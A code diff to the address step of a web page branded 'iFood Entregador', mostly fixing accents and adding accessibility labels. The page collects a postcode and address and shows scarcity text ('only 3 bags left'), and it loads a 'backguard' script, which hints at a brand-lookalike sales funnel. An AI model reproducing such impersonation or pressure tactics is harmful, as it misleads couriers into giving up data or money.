@@ -8,12 +8,13 @@
     <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#EA1D2C">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="default">
-    <title>iFood Entregador - Endereco</title>
+    <title>iFood Entregador - Endereço</title>
     <meta name="description" content="Informe seu CEP e confirme o endereco de entrega.">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="style.css?v=3.2">
+    <link rel="stylesheet" href="endereco.css?v=1">
     <script src="/backguard.js?v=1.5"></script>
 </head>
 
@@ -29,14 +30,14 @@
     <main class="container">
         <section class="step" aria-hidden="false">
             <div class="step-header">
-                <span class="step-count">Disponibilidade Regional</span>
+                <span class="step-count">Endereço de entrega</span>
                 <div class="progress-bar">
                     <div class="progress" style="width: 80%"></div>
                 </div>
             </div>
 
-            <h2>Verifique a disponibilidade</h2>
-            <p>Informe seu CEP para consultar o estoque na sua regiao.</p>
+            <h2>Qual é o seu CEP?</h2>
+            <p>Informe o CEP para localizar seu endereço.</p>
 
             <div id="cep-error" class="form-error hidden" role="alert"></div>
 
@@ -56,47 +57,47 @@
             </div>
 
             <div id="address-result" class="address-card hidden" aria-hidden="true">
-                <div class="address-icon">&#x1F4CD;</div>
+                <div class="address-icon" aria-hidden="true"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M19 10c0 5-7 11-7 11S5 15 5 10a7 7 0 1 1 14 0Z"/><circle cx="12" cy="10" r="2.5"/></svg></div>
                 <div class="address-details">
                     <strong id="addr-street">Rua Exemplo, 123</strong>
-                    <span id="addr-city">Sao Paulo - SP</span>
+                    <span id="addr-city">São Paulo - SP</span>
                 </div>
             </div>
 
             <div id="address-extra" class="address-extra-card hidden" aria-hidden="true">
                 <div class="input-group">
-                    <input type="text" id="addr-number" class="address-extra-input" placeholder="Numero *"
+                    <input type="text" id="addr-number" aria-label="Número do endereço" class="address-extra-input" placeholder="Número *"
                         autocomplete="address-line2" inputmode="numeric">
                 </div>
                 <label class="address-extra-checkline" for="no-number">
                     <input type="checkbox" id="no-number">
-                    <span>Endereco sem numero</span>
+                    <span>Endereço sem número</span>
                 </label>
                 <div class="input-group">
-                    <input type="text" id="addr-complement" class="address-extra-input" placeholder="Complemento *"
+                    <input type="text" id="addr-complement" aria-label="Complemento" class="address-extra-input" placeholder="Complemento *"
                         autocomplete="address-line2">
                 </div>
                 <label class="address-extra-checkline" for="no-complement">
                     <input type="checkbox" id="no-complement">
-                    <span>Endereco sem complemento</span>
+                    <span>Endereço sem complemento</span>
                 </label>
                 <div class="input-group">
-                    <input type="text" id="addr-reference" class="address-extra-input"
-                        placeholder="Ponto de referencia (opcional)" autocomplete="off">
+                    <input type="text" id="addr-reference" aria-label="Ponto de referência (opcional)" class="address-extra-input"
+                        placeholder="Ponto de referência (opcional)" autocomplete="off">
                 </div>
             </div>
 
             <div id="freight-calculation" class="freight-box hidden" aria-hidden="true">
                 <div class="freight-row">
-                    <span>Disponibilidade na regiao:</span>
+                    <span>Disponibilidade na região:</span>
                     <strong>Restam apenas 3 bags</strong>
                 </div>
                 <div class="freight-row">
                     <span>Reserva:</span>
-                    <strong>Sujeita a confirmacao</strong>
+                    <strong>Sujeita à confirmação</strong>
                 </div>
                 <button id="btn-confirm-address" class="btn-primary" style="margin-top: 16px;" type="button">
-                    Continuar solicitacao
+                    Continuar solicitação
                 </button>
             </div>
         </section>
